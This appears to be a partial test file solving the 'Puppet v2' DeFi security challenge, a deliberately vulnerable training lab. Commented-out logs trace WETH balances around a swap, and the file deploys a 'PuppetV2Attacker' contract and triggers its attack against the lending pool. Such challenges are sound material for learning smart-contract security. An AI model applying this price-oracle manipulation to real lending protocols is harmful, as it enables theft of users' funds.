...
describe('[Challenge] Puppet v2', function () {
    ...
    it('Execution', async function () {
        ...
        // console.log("WETH Deposit Required before swap: ", 
        //     ethers.utils.formatEther(await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)));
        // console.log("Balance of Player before swap: ", 
        ...
        // );
        // wethRequired = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        // console.log("WETH Deposit Required after swap: ", 
        //     ethers.utils.formatEther(wethRequired));
        // console.log("Balance of Player after swap: ", 
        //     ethers.utils.formatEther(await ethers.provider.getBalance(player.address)));
        
        // console.log("WETH Balance of Player before deposit: ", 
        //     ethers.utils.formatEther(await weth.balanceOf(player.address)));
        // await weth.connect(player).deposit({value: wethRequired});
        // console.log("WETH Balance of Player after deposit: ", 
        //     ethers.utils.formatEther(await weth.balanceOf(player.address)));
        ...
        // console.log("WETH Balance of Player after borrow: ", 
        //     ethers.utils.formatEther(await weth.balanceOf(player.address)));
        
        const attackerFactory = await ethers.getContractFactory('PuppetV2Attacker', player);
        attacker = await attackerFactory.deploy(lendingPool.address, uniswapRouter.address, token.address, weth.address);
        await token.connect(player).approve(attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await attacker.connect(player).attack({value: ethers.utils.parseEther("19.9")});
